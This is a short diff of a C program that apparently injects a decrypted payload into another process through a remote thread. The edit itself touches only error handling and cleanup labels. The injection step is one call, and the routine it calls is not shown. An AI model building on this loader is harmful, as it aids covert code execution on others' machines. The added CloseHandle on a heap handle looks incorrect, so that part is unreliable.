@@ -40,7 +40,9 @@ main(VOID)
 	{
 		dwLastError = GetLastError();
 		fprintf(stderr, "[%s:%i] HeapAlloc failed with code 0x%08lX\n", __FUNCTION__, __LINE__, dwLastError);
-		return dwLastError;
+		if (pbCryptInHeapPayload || pbPlainInHeapPayload)
+			pbCryptInHeapPayload ? HeapFree(hHeap, 0, pbCryptInHeapPayload) : HeapFree(hHeap, 0, pbPlainInHeapPayload);
+		goto closeheaphandle;
 	}
 
 	memcpy(pbCryptInHeapPayload, payload, payloadSize);
@@ -59,14 +61,17 @@ main(VOID)
 	{
 		fprintf(stderr, "Failed to get pid");
 		dwLastError = -1;
-		goto cleanup;
+		goto freeheaps;
 	}
 
 	ExecuteRemoteThread(dwProcId, pbPlainInHeapPayload, payloadSize);
 
-cleanup:
+freeheaps:
 	HeapFree(hHeap, 0, pbCryptInHeapPayload);
 	HeapFree(hHeap, 0, pbPlainInHeapPayload);
+
+closeheaphandle:
+	CloseHandle(hHeap);
 
 	printf("Program finished\n");
 	return dwLastError;
